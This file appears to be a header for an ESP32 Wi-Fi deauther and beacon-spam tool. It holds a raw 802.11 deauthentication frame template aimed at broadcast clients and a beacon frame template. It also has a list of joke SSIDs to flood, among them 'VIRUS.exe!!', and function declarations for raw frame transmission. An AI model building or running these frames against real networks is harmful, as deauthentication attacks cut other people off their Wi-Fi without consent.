#include "main.h"

uint8_t deauth_frame_default[26] = {
   /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
   /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
   /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
   /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
   /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
   /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
   /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
};

uint8_t beacon_frame[128] = { 
  0x80, 0x00,             // Frame Control
  0x00, 0x00,             // Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   // Destination address
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,   // Source address
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,   // BSSID
  0x00, 0x00,             // Sequence Control
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Timestamp
  0x64, 0x00,             // Beacon Interval
  0x31, 0x04,             // Capability info
  0x00                    // SSID Parameter
};

char ssids[10][32] = {
  "Cai Nay Hay VL",
  "Ban Tum Lum",
  "Free Wifi",
  "Tung tung Tokuda",
  "Day Di Og Chau Oi",
  "OI OI OI",
  "VIRUS.exe!!",
  "Mat khau WIFI la 123456789",
  "Ko Nen Xem 210 Biet Chua",
  "Traraleo Trarala"
};

struct Network {
  String ssid;
  int32_t channel;
  uint8_t bssid[6];
};

extern std::vector<Network> networks;

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

void deautherSetup();
void WifiDeauthhandleButton();

void beaconSetup();
void beaconLoop();